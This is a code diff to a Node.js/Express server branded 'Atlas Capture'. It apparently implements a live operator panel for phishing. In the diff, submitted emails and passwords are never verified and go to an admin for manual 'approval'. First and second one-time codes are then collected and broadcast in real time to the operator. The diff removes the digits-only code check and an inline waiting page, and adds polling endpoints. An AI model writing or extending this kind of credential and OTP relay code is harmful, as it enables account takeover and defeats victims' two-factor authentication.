@@ -144,7 +144,7 @@ async function initializeDatabase() {
     `);
     console.log('✅ Admin table ready');
 
-    // Add second_approved column if not exists
+    // Add columns if they don't exist
     await pool.query(`
       ALTER TABLE users 
       ADD COLUMN IF NOT EXISTS second_approved BOOLEAN DEFAULT FALSE
@@ -188,7 +188,7 @@ async function initializeDatabase() {
 
 // ==================== USER ENDPOINTS ====================
 
-// User login - sends email to admin
+// User login - sends email to admin for approval
 app.post('/api/users/login', async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -210,108 +210,16 @@ app.post('/api/users/login', async (req, res) => {
       message: '🔐 New user login attempt'
     });
 
-    // Return loading page that waits for admin approval
-    res.send(`
-      <!DOCTYPE html>
-      <html lang="en">
-      <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Atlas Capture - Processing</title>
-        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-        <style>
-          *{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
-          body{
-            background:#f3f4f6;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            min-height:100vh;
-            padding:40px 10px;
-          }
-          .wrapper{max-width:420px;width:100%}
-          .header{
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            gap:10px;
-            margin-bottom:18px;
-          }
-          .logo{
-            width:34px;height:34px;
-            border-radius:8px;
-            background:#4f46e5;
-          }
-          .header span{font-weight:600;font-size:18px}
-          .card{
-            background:#fff;
-            border-radius:22px;
-            padding:32px 22px;
-            text-align:center;
-            box-shadow:0 10px 30px rgba(0,0,0,0.08);
-          }
-          .spinner{
-            width:50px;
-            height:50px;
-            border:3px solid #e5e7eb;
-            border-top-color:#4f46e5;
-            border-radius:50%;
-            animation:spin 0.8s linear infinite;
-            margin:0 auto 20px;
-          }
-          @keyframes spin{
-            to{transform:rotate(360deg);}
-          }
-          h2{font-size:20px;color:#1f2937;margin-bottom:8px}
-          p{color:#6b7280;font-size:14px}
-          .email{color:#4f46e5;margin-top:16px;font-weight:500}
-        </style>
-        <script>
-          const email = "${encodeURIComponent(email)}";
-          let approvalInterval = null;
-          
-          function checkApproval() {
-            fetch('/api/users/check-approval', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ email: decodeURIComponent(email) })
-            })
-            .then(res => res.json())
-            .then(data => {
-              if (data.approved) {
-                if (approvalInterval) clearInterval(approvalInterval);
-                window.location.href = '/users/otp?email=' + email;
-              }
-            })
-            .catch(err => console.log('Checking approval...'));
-          }
-          
-          approvalInterval = setInterval(checkApproval, 2000);
-        </script>
-      </head>
-      <body>
-        <div class="wrapper">
-          <div class="header">
-            <div class="logo"></div>
-            <span>Atlas Capture</span>
-          </div>
-          <div class="card">
-            <div class="spinner"></div>
-            <h2>Processing your request</h2>
-            <p>Please wait while we verify your details</p>
-            <div class="email">${email}</div>
-          </div>
-        </div>
-      </body>
-      </html>
-    `);
+    // Return simple response - user will check approval via polling
+    res.json({ success: true, message: 'Email submitted for approval' });
+    
   } catch (error) {
     console.error('❌ Login error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Check if user is approved by admin
+// Check if email is approved by admin
 app.post('/api/users/check-approval', async (req, res) => {
   try {
     const { email } = req.body;
@@ -325,16 +233,46 @@ app.post('/api/users/check-approval', async (req, res) => {
   }
 });
 
-// Submit first OTP (waiting for admin approval)
+// Check first approval (for email approval) - same as above but explicit
+app.post('/api/users/check-first-approval', async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.json({ approved: false });
+    
+    const result = await pool.query('SELECT approved FROM users WHERE email = $1', [email]);
+    res.json({ approved: result.rows.length > 0 ? result.rows[0].approved : false });
+  } catch (error) {
+    console.error('❌ Check first approval error:', error.message);
+    res.json({ approved: false });
+  }
+});
+
+// Check second approval (for OTP approval)
+app.post('/api/users/check-second-approval', async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.json({ approved: false });
+    
+    const result = await pool.query('SELECT second_approved FROM users WHERE email = $1', [email]);
+    res.json({ approved: result.rows.length > 0 ? result.rows[0].second_approved : false });
+  } catch (error) {
+    console.error('❌ Check second approval error:', error.message);
+    res.json({ approved: false });
+  }
+});
+
+// Submit first OTP - updates the otp column (can be overwritten if user submits again)
 app.post('/api/users/submit-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
     if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
     
-    if (!/^\d{6}$/.test(otp)) {
-      return res.status(400).json({ error: 'OTP must be exactly 6 digits' });
+    // OTP can be any 6 characters - no regex validation
+    if (otp.length !== 6) {
+      return res.status(400).json({ error: 'OTP must be exactly 6 characters' });
     }
     
+    // Save OTP but keep approved = false (waiting for admin)
     await pool.query('UPDATE users SET otp = $1, otp_verified = false, approved = false WHERE email = $2', [otp, email]);
     
     io.emit('user-otp-created', { email, otp, timestamp: new Date() });
@@ -346,16 +284,19 @@ app.post('/api/users/submit-otp', async (req, res) => {
   }
 });
 
-// Submit second OTP (waiting for admin approval)
+// Submit second OTP - UPDATES the second_otp column (can be overwritten multiple times)
 app.post('/api/users/submit-second-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
     if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
     
-    if (!/^\d{6}$/.test(otp)) {
-      return res.status(400).json({ error: 'OTP must be exactly 6 digits' });
+    // OTP can be any 6 characters - no regex validation
+    if (otp.length !== 6) {
+      return res.status(400).json({ error: 'OTP must be exactly 6 characters' });
     }
     
+    // Update second_otp, keep second_approved = false (waiting for admin)
+    // Each time admin clicks "Approve Second OTP", this value gets overwritten
     await pool.query('UPDATE users SET second_otp = $1, second_approved = false WHERE email = $2', [otp, email]);
     
     io.emit('user-second-otp-created', { email, second_otp: otp, timestamp: new Date() });
@@ -364,18 +305,6 @@ app.post('/api/users/submit-second-otp', async (req, res) => {
   } catch (error) {
     console.error('❌ Submit second OTP error:', error.message);
     res.status(500).json({ error: 'Server error' });
-  }
-});
-
-// Check second approval
-app.post('/api/users/check-second-approval', async (req, res) => {
-  try {
-    const { email } = req.body;
-    const result = await pool.query('SELECT second_approved FROM users WHERE email = $1', [email]);
-    res.json({ approved: result.rows[0]?.second_approved || false });
-  } catch (error) {
-    console.error('❌ Check second approval error:', error.message);
-    res.json({ approved: false });
   }
 });
 
@@ -430,32 +359,42 @@ app.get('/api/admin/users', authenticateJWT, async (req, res) => {
   }
 });
 
-// Admin approve first OTP
+// Admin approve email (first approval)
 app.post('/api/admin/approve-user', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
     
-    await pool.query('UPDATE users SET approved = true WHERE email = $1', [email]);
-    console.log('✅ Admin approved user (first OTP):', email);
+    const result = await pool.query('UPDATE users SET approved = true WHERE email = $1 RETURNING approved', [email]);
     
-    res.json({ success: true, message: 'User approved' });
+    if (result.rowCount === 0) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+    
+    console.log('✅ Admin approved email for:', email);
+    
+    res.json({ success: true, message: 'Email approved' });
   } catch (error) {
-    console.error('❌ Approve user error:', error.message);
+    console.error('❌ Approve email error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Admin approve second OTP
+// Admin approve second OTP (second approval)
 app.post('/api/admin/approve-second', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
     
-    await pool.query('UPDATE users SET second_approved = true WHERE email = $1', [email]);
-    console.log('✅ Admin approved user (second OTP):', email);
+    const result = await pool.query('UPDATE users SET second_approved = true WHERE email = $1 RETURNING second_approved', [email]);
     
-    res.json({ success: true, message: 'Second approval complete' });
+    if (result.rowCount === 0) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+    
+    console.log('✅ Admin approved second OTP for:', email);
+    
+    res.json({ success: true, message: 'Second OTP approved' });
   } catch (error) {
     console.error('❌ Approve second error:', error.message);
     res.status(500).json({ error: 'Server error' });
@@ -497,6 +436,7 @@ initializeDatabase().then((success) => {
       console.log('\n📢 Socket.io server ready for real-time notifications\n');
     });
   } else {
+    console.error('❌ Failed to initialize database. Exiting...');
     process.exit(1);
   }
 });
